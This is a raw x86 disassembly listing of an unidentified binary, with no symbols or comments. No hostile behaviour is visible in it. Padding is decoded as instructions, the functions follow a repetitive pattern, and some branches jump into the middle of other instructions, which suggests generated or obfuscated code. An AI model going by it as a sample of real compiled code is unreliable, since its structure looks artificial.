  4d10d4:	pop    ecx
  4d10d5:	push   ecx
  4d10d6:	push   DWORD PTR [ecx+0x18]
  4d10d9:	push   DWORD PTR [ecx+0xcc]
  4d10df:	push   ebx
  4d10e0:	push   DWORD PTR [ecx+0x94]
  4d10e6:	call   0x4d0dc4
  4d10eb:	add    esp,0x10
  4d10ee:	pop    ecx
  4d10ef:	push   ecx
  4d10f0:	mov    eax,0x0
  4d10f5:	push   eax
  4d10f6:	call   0x4d0e14
  4d10fb:	add    esp,0x4
  4d10fe:	pop    ecx
  4d10ff:	add    esp,0x30
  4d1102:	pop    ebp
  4d1103:	ret    
  4d1104:	mov    edi,edi
  4d1106:	push   ebp
  4d1107:	mov    ebp,esp
  4d1109:	sub    esp,0x60
  4d110c:	lea    ecx,ds:0x4d3084
  4d1112:	mov    eax,0xfffffff3
  4d1117:	push   ecx
  4d1118:	push   edx
  4d1119:	push   edx
  4d111a:	call   0x4d0d2c
  4d111f:	add    esp,0x8
  4d1122:	pop    ecx
  4d1123:	push   ecx
  4d1124:	push   0x0
  4d1126:	call   0x4d0d20
  4d112b:	add    esp,0x4
  4d112e:	pop    ecx
  4d112f:	push   ecx
  4d1130:	call   0x4d084c
  4d1135:	add    esp,0x4
  4d1138:	pop    ecx
  4d1139:	add    esp,0x60
  4d113c:	pop    ebp
  4d113d:	ret    
  4d113e:	add    BYTE PTR [eax],al
  4d1140:	pop    edi
  4d1141:	call   DWORD PTR ds:0x4d2064
  4d1147:	call   edi
  4d1149:	add    BYTE PTR [eax],al
  4d114b:	add    BYTE PTR [edi-0x1],bl
  4d114e:	adc    eax,0x4d2038
  4d1153:	call   edi
  4d1155:	add    BYTE PTR [eax],al
  4d1157:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d115d:	sub    esp,0x34
  4d1160:	lea    ecx,[esi+0x88]
  4d1166:	mov    edi,DWORD PTR [ebp-0x14]
  4d1169:	push   ecx
  4d116a:	call   0x4d0d14
  4d116f:	add    esp,0x4
  4d1172:	pop    ecx
  4d1173:	push   ecx
  4d1174:	push   DWORD PTR [ecx+0xc0]
  4d117a:	push   DWORD PTR [ecx+0x20]
  4d117d:	push   esi
  4d117e:	push   DWORD PTR [ecx+0x4c]
  4d1181:	call   0x4d0f9c
  4d1186:	add    esp,0x10
  4d1189:	pop    ecx
  4d118a:	push   ecx
  4d118b:	push   0x0
  4d118d:	call   0x4d12e8
  4d1192:	add    esp,0x4
  4d1195:	pop    ecx
  4d1196:	add    esp,0x34
  4d1199:	pop    ebp
  4d119a:	ret    
  4d119b:	add    BYTE PTR [edi-0x1],bl
  4d119e:	adc    eax,0x4d2074
  4d11a3:	call   edi
  4d11a5:	add    BYTE PTR [eax],al
  4d11a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11ad:	sub    esp,0x60
  4d11b0:	mov    ebx,0x4d308c
  4d11b5:	sub    DWORD PTR [ebx+0x80],edi
  4d11bb:	push   ebx
  4d11bc:	push   esi
  4d11bd:	push   DWORD PTR [ebx+0xdc]
  4d11c3:	call   0x4d0bcc
  4d11c8:	add    esp,0x8
  4d11cb:	pop    ebx
  4d11cc:	lea    ecx,[ebx-0x8c]
  4d11d2:	push   ecx
  4d11d3:	call   0x4d0fe0
  4d11d8:	add    esp,0x4
  4d11db:	test   eax,eax
  4d11dd:	jne    0x4d11cd
  4d11df:	push   0x0
  4d11e1:	call   0x4d12e8
  4d11e6:	add    esp,0x4
  4d11e9:	add    esp,0x60
  4d11ec:	pop    ebp
  4d11ed:	ret    
  4d11ee:	add    BYTE PTR [eax],al
  4d11f0:	mov    edi,edi
  4d11f2:	push   ebp
  4d11f3:	mov    ebp,esp
  4d11f5:	sub    esp,0x54
  4d11f8:	lea    eax,[esi-0x140]
  4d11fe:	or     edi,DWORD PTR [ebp-0x10]
  4d1201:	push   eax
  4d1202:	push   DWORD PTR [eax+0x120]
  4d1208:	push   DWORD PTR [eax+0x5c]
  4d120b:	push   edi
  4d120c:	call   0x4d11a8
  4d1211:	add    esp,0xc
  4d1214:	pop    eax
  4d1215:	push   eax
  4d1216:	mov    eax,0x0
  4d121b:	push   eax
  4d121c:	call   0x4d12e8
  4d1221:	add    esp,0x4
  4d1224:	pop    eax
  4d1225:	push   eax
  4d1226:	push   0x0
  4d1228:	call   0x4d0f48
  4d122d:	add    esp,0x4
  4d1230:	pop    eax
  4d1231:	add    esp,0x54
  4d1234:	pop    ebp
  4d1235:	ret    
  4d1236:	add    BYTE PTR [eax],al
  4d1238:	mov    edi,edi
  4d123a:	push   ebp
  4d123b:	mov    ebp,esp
  4d123d:	sub    esp,0x40
  4d1240:	lea    eax,[edi-0xd0]
  4d1246:	and    DWORD PTR [ebp-0x10],edi
  4d1249:	push   eax
  4d124a:	push   edx
  4d124b:	push   DWORD PTR [eax+0x60]
  4d124e:	push   ecx
  4d124f:	push   DWORD PTR [eax+0x164]
  4d1255:	call   0x4d1104
  4d125a:	add    esp,0x10
  4d125d:	pop    eax
  4d125e:	push   eax
  4d125f:	call   0x4d0d14
  4d1264:	add    esp,0x4
  4d1267:	pop    eax
  4d1268:	push   eax
  4d1269:	push   0xfffffff4
  4d126b:	call   0x4d0b2c
  4d1270:	add    esp,0x4
  4d1273:	pop    eax
  4d1274:	add    esp,0x40
  4d1277:	pop    ebp
  4d1278:	ret    
  4d1279:	add    BYTE PTR [eax],al
  4d127b:	add    BYTE PTR [edi-0x1],bl
  4d127e:	adc    eax,0x4d2080
  4d1283:	call   edi
  4d1285:	add    BYTE PTR [eax],al
  4d1287:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d128d:	sub    esp,0x48
  4d1290:	lea    ebx,[ecx+0x50]
  4d1293:	sub    esi,edi
  4d1295:	push   0x0
  4d1297:	call   0x4d0858
  4d129c:	add    esp,0x4
  4d129f:	push   ebx
  4d12a0:	push   edx
  4d12a1:	push   DWORD PTR [ebx+0x128]
  4d12a7:	push   DWORD PTR [ebx+0x1f8]
  4d12ad:	push   esi
  4d12ae:	call   0x4d1034
  4d12b3:	add    esp,0x10
  4d12b6:	pop    ebx
  4d12b7:	call   0x4d0c68
  4d12bc:	add    esp,0x4
  4d12bf:	add    esp,0x48
  4d12c2:	pop    ebp
  4d12c3:	ret    
  4d12c4:	pop    edi
  4d12c5:	call   DWORD PTR ds:0x4d2044
  4d12cb:	call   edi
  4d12cd:	add    BYTE PTR [eax],al
  4d12cf:	add    BYTE PTR [edi-0x1],bl
  4d12d2:	adc    eax,0x4d208c
  4d12d7:	call   edi
  4d12d9:	add    BYTE PTR [eax],al
  4d12db:	add    BYTE PTR [edi-0x1],bl
  4d12de:	adc    eax,0x4d204c
  4d12e3:	call   edi
  4d12e5:	add    BYTE PTR [eax],al
  4d12e7:	add    BYTE PTR [edi-0x1],bl
  4d12ea:	adc    eax,0x4d200c
  4d12ef:	call   edi
  4d12f1:	add    BYTE PTR [eax],al
  4d12f3:	add    BYTE PTR [edi-0x1],bl
  4d12f6:	adc    eax,0x4d2014
  4d12fb:	call   edi
  4d12fd:	add    BYTE PTR [eax],al
  4d12ff:	add    BYTE PTR [edi-0x1],bl
  4d1302:	adc    eax,0x4d2040
  4d1307:	call   edi
  4d1309:	add    BYTE PTR [eax],al
  4d130b:	add    BYTE PTR [edi-0x1],bl
  4d130e:	adc    eax,0x4d2098
  4d1313:	call   edi
  4d1315:	add    BYTE PTR [eax],al
  4d1317:	add    BYTE PTR [edi-0x1],bl
  4d131a:	adc    eax,0x4d203c
  4d131f:	call   edi
  4d1321:	add    BYTE PTR [eax],al
  4d1323:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1329:	sub    esp,0x34
  4d132c:	mov    ebx,0x4d3088
  4d1331:	sub    DWORD PTR [ebp-0x2c],ecx
  4d1334:	push   0x0
  4d1336:	call   0x4d08c8
  4d133b:	add    esp,0x4
  4d133e:	push   ebx
  4d133f:	push   edx
  4d1340:	push   DWORD PTR [ebx+0x2c]
  4d1343:	push   edx
  4d1344:	push   ecx
  4d1345:	call   0x4d0778
  4d134a:	add    esp,0x10
  4d134d:	pop    ebx
  4d134e:	mov    edi,0x0
  4d1353:	push   edi
  4d1354:	call   0x4d08c8
  4d1359:	add    esp,0x4
  4d135c:	add    esp,0x34
  4d135f:	pop    ebp
  4d1360:	ret    
  4d1361:	add    BYTE PTR [eax],al
  4d1363:	add    BYTE PTR [edi-0x1],bl
  4d1366:	adc    eax,0x4d2078
  4d136b:	call   edi
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d2084
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x44
  4d1384:	mov    edi,0x4d30dc
  4d1389:	xor    DWORD PTR [edi+0x74],0xf8b
  4d1390:	push   edi
  4d1391:	push   0x0
  4d1393:	call   0x4d0858
  4d1398:	add    esp,0x4
  4d139b:	pop    edi
  4d139c:	push   edi
  4d139d:	push   DWORD PTR [edi+0x1b0]
  4d13a3:	push   ebx
  4d13a4:	push   ebx
  4d13a5:	push   DWORD PTR [edi+0x94]
  4d13ab:	call   0x4d096c
  4d13b0:	add    esp,0x10
  4d13b3:	pop    edi
  4d13b4:	push   edi
  4d13b5:	mov    ebx,0x0
  4d13ba:	push   ebx
  4d13bb:	call   0x4d12f4
  4d13c0:	add    esp,0x4
  4d13c3:	pop    edi
  4d13c4:	add    esp,0x44
  4d13c7:	pop    ebp
  4d13c8:	ret    
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [edi-0x1],bl
  4d13ce:	adc    eax,0x4d2094
  4d13d3:	call   edi
  4d13d5:	add    BYTE PTR [eax],al
  4d13d7:	add    BYTE PTR [edi-0x1],bl
  4d13da:	adc    eax,0x4d2070
  4d13df:	call   edi
  4d13e1:	add    BYTE PTR [eax],al
  4d13e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e9:	sub    esp,0x5c
  4d13ec:	mov    ebx,0x4d3164
  4d13f1:	add    DWORD PTR [ebx-0x114],esi
  4d13f7:	push   ebx
  4d13f8:	push   eax
  4d13f9:	push   ecx
  4d13fa:	call   0x4d0b44
  4d13ff:	add    esp,0x8
  4d1402:	pop    ebx
  4d1403:	call   0x4d0d14
  4d1408:	add    esp,0x4
  4d140b:	call   0x4d0c68
  4d1410:	add    esp,0x4
  4d1413:	add    esp,0x5c
  4d1416:	pop    ebp
  4d1417:	ret    
  4d1418:	mov    edi,edi
  4d141a:	push   ebp
  4d141b:	mov    ebp,esp
  4d141d:	sub    esp,0x44
  4d1420:	lea    edx,[edi+0x9c]
  4d1426:	sub    eax,0xffffffad
  4d1429:	push   edx
  4d142a:	mov    esi,0x0
  4d142f:	push   esi
  4d1430:	call   0x4d08c8
  4d1435:	add    esp,0x4
  4d1438:	pop    edx
  4d1439:	push   edx
  4d143a:	push   DWORD PTR [edx+0x10c]
  4d1440:	push   DWORD PTR [edx+0xc4]
  4d1446:	push   DWORD PTR [edx+0x160]
  4d144c:	push   DWORD PTR [edx+0x128]
  4d1452:	call   0x4d0c74
  4d1457:	add    esp,0x10
  4d145a:	pop    edx
  4d145b:	push   edx
  4d145c:	mov    esi,0x0
  4d1461:	push   esi
  4d1462:	call   0x4d0f48
  4d1467:	add    esp,0x4
  4d146a:	pop    edx
  4d146b:	add    esp,0x44
  4d146e:	pop    ebp
  4d146f:	ret    
  4d1470:	mov    edi,edi
  4d1472:	push   ebp
  4d1473:	mov    ebp,esp
  4d1475:	sub    esp,0x5c
  4d1478:	lea    esi,[edi+0x180]
  4d147e:	add    DWORD PTR [esi+0x20],0x65d0
  4d1485:	mov    edx,0x0
  4d148a:	push   edx
  4d148b:	call   0x4d0858
  4d1490:	add    esp,0x4
  4d1493:	push   esi
  4d1494:	push   DWORD PTR [esi+0x20]
  4d1497:	push   edi
  4d1498:	push   ebx
  4d1499:	call   0x4d10b4
  4d149e:	add    esp,0xc
  4d14a1:	pop    esi
  4d14a2:	mov    edx,0x0
  4d14a7:	push   edx
  4d14a8:	call   0x4d12e8
  4d14ad:	add    esp,0x4
  4d14b0:	add    esp,0x5c
  4d14b3:	pop    ebp
  4d14b4:	ret    
  4d14b5:	add    BYTE PTR [eax],al
  4d14b7:	add    BYTE PTR [edi-0x1],bl
  4d14ba:	adc    eax,0x4d2054
  4d14bf:	call   edi
  4d14c1:	add    BYTE PTR [eax],al
  4d14c3:	add    BYTE PTR [edi-0x1],bl
  4d14c6:	adc    eax,0x4d2048
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d5:	sub    esp,0x20
  4d14d8:	mov    ebx,0x4d31b4
  4d14dd:	adc    eax,DWORD PTR [ebx+0xc]
  4d14e0:	lea    edx,[ebx-0x1b4]
  4d14e6:	push   edx
  4d14e7:	call   0x4d0fe0
  4d14ec:	add    esp,0x4
  4d14ef:	test   eax,eax
  4d14f1:	jne    0x4d14e1
  4d14f3:	push   ebx
  4d14f4:	push   DWORD PTR [ebx+0xb4]
  4d14fa:	push   DWORD PTR [ebx+0x11c]
  4d1500:	call   0x4d0b88
  4d1505:	add    esp,0x8
  4d1508:	pop    ebx
  4d1509:	push   0x0
  4d150b:	call   0x4d0e14
  4d1510:	add    esp,0x4
  4d1513:	add    esp,0x20
  4d1516:	pop    ebp
  4d1517:	ret    
  4d1518:	pop    edi
  4d1519:	call   DWORD PTR ds:0x4d20a0
  4d151f:	call   edi
  4d1521:	add    BYTE PTR [eax],al
  4d1523:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1529:	sub    esp,0x30
  4d152c:	lea    esi,ds:0x4d31e4
  4d1532:	cmp    esi,0x6deb
  4d1538:	jbe    0x4d1527
  4d153a:	call   0x4d0c68
  4d153f:	add    esp,0x4
  4d1542:	push   esi
  4d1543:	push   edx
  4d1544:	push   ecx
  4d1545:	call   0x4d08e0
  4d154a:	add    esp,0x8
  4d154d:	pop    esi
  4d154e:	mov    edi,0x0
  4d1553:	push   edi
  4d1554:	call   0x4d0a90
  4d1559:	add    esp,0x4
  4d155c:	add    esp,0x30
  4d155f:	pop    ebp
  4d1560:	ret    
  4d1561:	add    BYTE PTR [eax],al
  4d1563:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1569:	sub    esp,0x30
  4d156c:	lea    ebx,ds:0x4d3034
  4d1572:	mov    edx,DWORD PTR [ebp-0x18]
  4d1575:	lea    esi,[ebx-0x34]
  4d1578:	push   esi
  4d1579:	call   0x4d0fe0
  4d157e:	add    esp,0x4
  4d1581:	test   eax,eax
  4d1583:	jne    0x4d1576
  4d1585:	push   ebx
  4d1586:	push   esi
  4d1587:	push   DWORD PTR [ebx+0x180]
  4d158d:	push   ecx
  4d158e:	push   edi
  4d158f:	call   0x4d1524
  4d1594:	add    esp,0x10
  4d1597:	pop    ebx
  4d1598:	mov    edi,0x0
  4d159d:	push   edi
  4d159e:	call   0x4d0e14
  4d15a3:	add    esp,0x4
  4d15a6:	add    esp,0x30
  4d15a9:	pop    ebp
  4d15aa:	ret    
	...
